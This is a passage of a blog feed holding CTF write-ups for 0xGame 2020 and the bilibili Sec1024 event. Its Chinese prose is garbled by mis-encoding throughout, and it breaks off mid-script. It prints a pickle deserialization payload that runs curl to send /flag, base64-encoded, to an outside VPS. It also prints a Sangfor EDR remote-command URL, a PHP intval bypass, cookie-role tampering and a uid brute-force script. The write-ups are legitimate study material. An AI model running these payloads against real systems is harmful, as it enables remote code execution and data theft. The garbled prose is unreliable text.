<code>Cookies</code>ï¼Œä¿®æ”¹åé‡æ–°è®¿é—®ï¼Œç†è®ºä¸Šå°±èƒ½åœ¨ VPS ä¸Šæ‹¿åˆ° base64 ç¼–ç çš„ flagã€‚</p><p>ç„¶è€Œå¹¶æ²¡æœ‰æˆåŠŸã€‚ã€‚æ‰“è¿‡å»ä¹‹åè¿”å› 500 Internal Server Error.</p><p>æ¯”èµ›ç»“æŸä¹‹åçœ‹äº†å®˜æ–¹WPï¼Œæ‰çŸ¥é“åŸæ¥æ˜¯æ“ä½œç³»ç»Ÿçš„é”…ï¼Œæˆ‘è¿™ä¸ªæ˜¯åœ¨ Windows ä¸‹ç”Ÿæˆçš„ã€‚</p><p>è¿™ä¸ªåºåˆ—åŒ–çš„ç»“æœè¿˜ä¸æ“ä½œç³»ç»Ÿæœ‰å…³ç³»ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201105235424496.png" alt="nt"></p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201105235523612.png" alt="å®˜æ–¹WP"></p><p>ä¿®æ”¹ä¸º <code>posix</code>ï¼Œæˆ–è€…åœ¨ Linux ä¸‹ç”Ÿæˆå°±æ²¡è¿™ä¸ªé—®é¢˜äº†ã€‚</p><p>å¦å¤–å‘ç°éœ€è¦å»æ‰ pickle çš„ç‰ˆæœ¬æ ‡è¯† <code>\x80\x03</code>.æˆ‘ç”¨çš„ opcode æ˜¯ Python3 ä¸‹çš„ ç‰ˆæœ¬3ã€‚</p><p>äºæ˜¯æˆ‘è¿™ä¸ª payload å°±æ˜¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'cposix\nsystem\nX3\x00\x00\x00curl http://VPS:PORT/`cat /flag | base64`\x85R.'</span></code></pre><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201106000045787.png" alt="payload"></p><p>ä¿®æ”¹ Cookiesï¼Œåœ¨ VPS ä¸Šæ¥æ”¶ä¸€ä¸‹ï¼Œæ‹¿åˆ° flagã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201106000321983.png" alt="flag"></p><h3 id="Misc-flip"><a href="#Misc-flip" class="headerlink" title="Misc_flip"></a>Misc_flip</h3><p><code>pwd.mp3</code> ä¸€å¬å°±æ˜¯ç”µæŠ¥äº†ï¼Œè€æ‘©æ–¯äº†ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028161431879.png" alt="Morse Code"></p><p>è¯»å‡ºæ¥æ˜¯</p><pre class="language-none"><code class="language-none">....- ----- ----- ---.. ..... -.... -.... ----. ----. ...-- ----- ----- ... .. -.. .-. --- .-- ... ... .- .--.</code></pre><p> è§£ç å¾—åˆ°</p><pre class="language-none"><code class="language-none">400856699300SIDROWSSAP</code></pre><p>ä¸€çœ‹å°±æ˜¯å€’è¿‡æ¥äº†çš„ï¼Œé‚£å°±å€’å›å»ã€‚</p><pre class="language-none"><code class="language-none">PASSWORDIS003996658004</code></pre><p>æ‹¿ <code>003996658004</code> å»è§£å‹ <code>galf_si_siht_2.zip</code>ï¼Œå¾—åˆ° <code>galf_si_siht.zip</code>ã€‚</p><p>å‘ç°æ‰“ä¸å¼€ï¼Œæ”¾åˆ° 010 Editor é‡Œï¼Œå‘ç°å¥—äº†ä¸¤ä¸ª zipï¼Œè€ç¼åˆæ€ªäº†ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028163048687.png" alt="504B0304"></p><p>åˆ†åˆ«æŠŠä¸¤ä¸ª zip æå–å‡ºæ¥ã€‚</p><p><code>password.txt</code>:</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028163217484.png" alt="image-20201028163217484"></p><blockquote><p>I want to write file in binary, but something seems to be wrong?</p></blockquote><p>çœ‹åˆ°æœ«å°¾ä¸€ä½éƒ½æ˜¯0ï¼Œç›²çŒœæ˜¯å€’è¿‡æ¥çš„ ASCIIã€‚å†™ä¸ªè„šæœ¬è¯•è¯•ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""1010011011010110......10011010"""</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>pwd<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>    x <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pwd <span class="token operator">+=</span> char    <span class="token keyword">print</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pwd<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># You are so clever that this problem is just a piece of cake for you, the password is A_pi3ce_0f_C4ke</span></code></pre><p>å¾—åˆ°å¯†ç ä¸º <code>A_pi3ce_0f_C4ke</code>ã€‚</p><p>è§£å‹<code>galf_si_siht.png</code>ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028164030719.png" alt="galf_si_siht.png"></p><p>å¥½å®¶ä¼™ï¼Œåˆæ˜¯å€’è¿‡æ¥çš„ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"galf_si_siht.png"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    img <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"galf_si_siht_fix.png"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028164315941.png" alt="qrcode"></p><p>æ‰«ç å¾—åˆ° <a href="http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php">http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php</a></p><p><code>0xGame{b07906f9-f6f5-4120-9f80-01d761c8602e}</code></p><p><em>è€å¥—å¨ƒäº†ï¼ˆ</em></p><h3 id="Misc-Hexé…±"><a href="#Misc-Hexé…±" class="headerlink" title="Misc_Hexé…±"></a>Misc_Hexé…±</h3><p>å‘ç°è¿‡æ»¤çš„å…³é”®å­—å…¶å®åªæ˜¯å‘½ä»¤é‡ŒåŒ…å«ç›¸åº”çš„å­—ç¬¦è€Œå·²ï¼Œå¤§å†™ç»•è¿‡å°±å®Œäº‹äº†~</p><p>ä¸è¿‡è¿˜æ˜¯æ—¥äº†ä¸€ä¸ªæ™šä¸Šï¼ˆï¼ˆ</p><p>ä¹‹å‰è¿˜æ²¡æ€ä¹ˆåœ¨ Windows ä¸‹æ•´å‘½ä»¤è¡Œï¼Œè¿™æ¬¡è¿˜ç‰¹åœ°å»æŸ¥äº†ä¸€ç•ªã€‚</p><p>æœ€å¼€å§‹è¿˜æ˜¯ç»•äº†ä¸€å¤§å¼¯ï¼Œæœ¬æ¥ä¸çŸ¥é“ flag åœ¨å“ªï¼Œæ‰¾äº†åŠå¤©çªç„¶æƒ³åˆ°åº”è¯¥å°±åœ¨æ¡Œé¢ä¸Šäº†ã€‚</p><p>å½“å‰è·¯å¾„æ˜¯  <code>C:\Users\Administrator\Desktop\Game\HexQBot</code></p><p>é€šè¿‡ç¯å¢ƒå˜é‡å’Œé€šé…ç¬¦ï¼Œå¤åˆ¶å†è¯»å– flagã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000235458.png"></p><p>åæ¥çªç„¶æƒ³åˆ°ä¸ç”¨è¿™ä¹ˆå¤æ‚ï¼Œç›´æ¥è¯»å°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000757009.png" alt="flag"></p><p>åé¢é—®äº†å‡ºé¢˜çš„ Am473ur å¸ˆå‚…ï¼Œè¿™ä¸ªè¿”å›å†…å®¹çš„é•¿åº¦æœ‰äº†é™åˆ¶ï¼Œæ‰€ä»¥æœ‰çš„æŒ‡ä»¤å‘è¿‡å»æ²¡æœ‰è¿”å›äº†ã€‚</p><p>å¦å¤–è¿™ä¸ª Hexé…± æŒºå®¹æ˜“å´©çš„ï¼Œå¿ƒç–¼ä¸€ä¸‹è¿ç»´å¸ˆå‚…ï¼ˆ</p><hr><h2 id="Week-3"><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h2><p>ä¹‹å‰å‡ å‘¨æ‡’äº†ï¼Œå°±éšä¾¿çœ‹çœ‹é¢˜åšåšé¢˜ï¼Œ<strong>åŸºæœ¬æ²¡å†™ WP</strong>ï¼Œå°±è¿™æ ·8.</p><h3 id="Web-intval"><a href="#Web-intval" class="headerlink" title="Web_intval"></a>Web_intval</h3><p><strong>payload:</strong></p><blockquote><p><a href="http://web.game.0xctf.com:30102/?0xGame=20201001%0A&amp;id=1024.3">http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3</a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ffllaagg.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1st</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'20201001'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^20201001$/'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Good job!'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Think it over!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//2nd</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">===</span> <span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Congratulations!'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Work harder!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Good job<span class="token operator">!</span>Congratulations<span class="token operator">!</span><span class="token number">0</span>xGame<span class="token punctuation">{</span><span class="token number">947</span>eae96fe415cbc6eab176f15dd98b1<span class="token punctuation">}</span></span></code></pre><h3 id="Web-edr"><a href="#Web-edr" class="headerlink" title="Web_edr"></a>Web_edr</h3><p><strong>æ·±ä¿¡æœ RCE</strong></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_37602797/article/details/108068122">https://blog.csdn.net/qq_37602797/article/details/108068122</a></p><p><a href="https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ">https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ</a></p><p><strong>payload:</strong></p><blockquote><p><a href="http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag">http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag</a></p></blockquote><p><code>0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚</p><p><em>ï¼ˆé¦–å°¾å‘¼åº”</em></p><p>ï¼ˆæºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 bilibili Sec1024 WriteUp</title>
      <link href="2020/10/26/CTF_2020bilibiliSec1024/"/>
      <url>2020/10/26/CTF_2020bilibiliSec1024/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/83b92f73637ab8056346bb6b8a3af6d9840e8bb0.jpg"></p><p>Bilibili å°ç ´ç«™æ•´äº†ä¸ª Sec1024ï¼Œ1024 å‡Œæ™¨çœ‹ç¾¤é‡Œæœ‰å¸ˆå‚…æåˆ°å°±æ¥çœ‹äº†ä¸€çœ¼ã€‚</p><p>ç»“æœè¢«å¡ä½äº†åšä¸ä¸‹å»ï¼Œäºæ˜¯åˆçœ‹äº†ä¸€ä¸‹åˆã€‚ã€‚</p><p><strong>2020-1024=996</strong></p><p>æ‰€ä»¥å¤§å®¶éƒ½åŠ ç­äº†å”‰ï¼Ÿ</p><p>å±å®æ¶å¿ƒäººï¼ˆ</p><p>éšæ„å†™ä¸ª Write Up å¥½äº†ã€‚</p><blockquote><p>P.S.: </p><p>æŒ‰é“ç†ï¼Œæ¯”èµ›æœªç»“æŸä¸åº”è¯¥å‘å‡ºæ¥çš„ï¼Œä¸è¿‡ç®—äº†8ï¼Œç°åœ¨ä¸€æœåˆ°å¤„éƒ½æ˜¯ flag äº†ï¼Œå¼€å¿ƒå°±å¥½ã€‚</p></blockquote><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026010246030.png"></p><hr><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>é¡µé¢çš„èƒŒåæ˜¯ä»€ä¹ˆï¼Ÿ</p><p><a href="http://45.113.201.36/index.html">http://45.113.201.36/index.html</a></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025231922476.png" alt="1"></p><p>ä¸€çœ‹åˆ°å°±ä»¥ä¸ºæ˜¯æ”¹ UAï¼Œè°çŸ¥é“å…¶å®æ˜¯ç¬¬äºŒé¢˜çš„ç­”æ¡ˆ2333.</p><p>ç¬¬ä¸€é¢˜åœ¨è¿™é‡Œ</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025232041445.png" alt="flag1"></p><p>å…¶å®æ˜¯è°ƒç”¨äº† <a href="http://45.113.201.36/api/admin">http://45.113.201.36/api/admin</a> è¿™ä¸ªæ¥å£ã€‚</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>çœŸæ­£çš„ç§˜å¯†åªæœ‰ç‰¹æ®Šçš„è®¾å¤‡æ‰èƒ½çœ‹åˆ°</p><p>æ”¹ UA å³å¯ã€‚</p><p><a href="http://45.113.201.36/api/ctf/2">http://45.113.201.36/api/ctf/2</a></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025232314019.png" alt="flag2"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>å¯†ç æ˜¯å•¥ï¼Ÿ</p><p><a href="http://45.113.201.36/login.html">http://45.113.201.36/login.html</a></p><p>æœ¬æ¥ä»¥ä¸ºæ˜¯ sql æ³¨å…¥ï¼Œä½†è¯•äº†å‘ç°ä¸å¯¹åŠ²ï¼Œæ€ä¹ˆéƒ½æ³¨ä¸è¿›å»ã€‚ç›²æ³¨çš„è¯ä¹Ÿæ²¡æœ‰æ‰€éœ€è¦çš„è¿”å›ä¿¡æ¯ã€‚</p><p>æœ€ååº”è¯¥åªæœ‰å¼±å¯†ç äº†ã€‚</p><p>è·‘äº†ä¸€å †å­—å…¸éƒ½ä¸è¡Œï¼Œæœ€åçªç„¶ä¸€æƒ³ï¼Œæ‰‹è¾“äº†ä¸ª <code>bilibili</code> å‡ºæ¥äº†ã€‚</p><p><em>ï¼ˆæ‘Šæ‰‹ï¼Œå°±ç¦»è°±</em></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024125447298.png" alt="flag3"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>å¯¹ä¸èµ·ï¼Œæƒé™ä¸è¶³ï½</p><p><a href="http://45.113.201.36/">http://45.113.201.36/</a></p><p>superadmin.html</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024171348245.png" alt="4"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token operator">:</span> <span class="token string">"api/ctf/4"</span><span class="token punctuation">,</span>    type<span class="token operator">:</span> <span class="token string">"get"</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">// å¦‚æœæœ‰å€¼ï¼šå‰ç«¯è·³è½¬</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"æ¬¢è¿è¶…çº§ç®¡ç†å‘˜ç™»é™†ï½ç­”æ¡ˆæ˜¯ : {{ "</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token string">" }}"</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment">// å¦‚æœæ²¡å€¼</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"æœ‰äº›ç§˜å¯†åªæœ‰è¶…çº§ç®¡ç†å‘˜æ‰èƒ½çœ‹è§å“¦~"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>å‘ç°è¯·æ±‚è¿™ä¸ª API ä¼šè¿”å›ä¸€ä¸ªåä¸º <code>role</code> çš„ cookieï¼Œé‡Œé¢å†…å®¹æ­£å¥½32ä½ï¼Œè€ƒè™‘å°±æ˜¯ md5 äº†ã€‚</p><p><code>ee11cbb19052e40b07aac0ca060c23ee</code></p><p>è§£å¯†å‘ç°è¿™ä¸ªæ˜¯ <code>user</code>ã€‚</p><p>æ—¢ç„¶è¯´è¦<strong>è¶…çº§ç®¡ç†å‘˜</strong>ï¼Œ é‚£åº”è¯¥å°±æ˜¯æ”¹è¿™ä¸ªäº†ã€‚</p><p>è¯•äº† superadmin, admin, root, administrator, superuser, bilibili, â€¦ éƒ½ä¸å¯¹ã€‚</p><p>æœ€åå‘ç°æ˜¯ Administratorã€‚è¿™ä¸æ˜¯è„‘ç­‹æ€¥è½¬å¼¯å˜›ï¼Ÿï¼Ÿï¼Ÿ</p><p>md5 â€“&gt; <code>7b7bc2512ee1fedcd76bdc68926d4f7b</code></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024171757737.png" alt="flag4"></p><p>å“¦å¯¹äº†ï¼Œcookie è¦å¸¦ä¸Š sessionï¼Œé‡Œé¢è®°å½•äº†ç”¨æˆ·ç™»å½•ä¿¡æ¯ï¼Œå¦åˆ™ä¼šæç¤º <code>è¯·å…ˆç™»å½•</code>ã€‚</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>åˆ«äººçš„ç§˜å¯†</p><p><a href="http://45.113.201.36/user.html">http://45.113.201.36/user.html</a></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">$</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function-variable function">getUrlParam</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"(^|&amp;)"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=([^&amp;]*)(&amp;|$)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> r <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>jQuery<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> uid <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">getUrlParam</span><span class="token punctuation">(</span><span class="token string">'uid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uid <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        uid <span class="token operator">=</span> <span class="token number">100336889</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        url<span class="token operator">:</span> <span class="token string">"api/ctf/5?uid="</span> <span class="token operator">+</span> uid<span class="token punctuation">,</span>        type<span class="token operator">:</span> <span class="token string">"get"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment">// å¦‚æœæœ‰å€¼ï¼šå‰ç«¯è·³è½¬</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"æ¬¢è¿è¶…çº§ç®¡ç†å‘˜ç™»é™†ï½flag : "</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>data <span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment">// å¦‚æœæ²¡å€¼</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"è¿™é‡Œæ²¡æœ‰ä½ æƒ³è¦çš„ç­”æ¡ˆï½"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åœ¨æ‰€ç»™çš„ uid 100336889 é™„è¿‘çˆ†ç ´ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> timex <span class="token operator">=</span> <span class="token number">100336889</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session=xxxxxxxxxxxxxxxxxxx'</span><span class="token punctuation">}</span><span class="token keyword">for</span> uid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1500</span><span class="token punctuation">,</span> x<span class="token operator">+</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://45.113.201.36/api/ctf/5?uid=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>        r_json <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r_json<span class="token punctuation">)</span>        <span class="token keyword">if</span> r_json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'!!!!!!!!!!!!'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r_json<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token 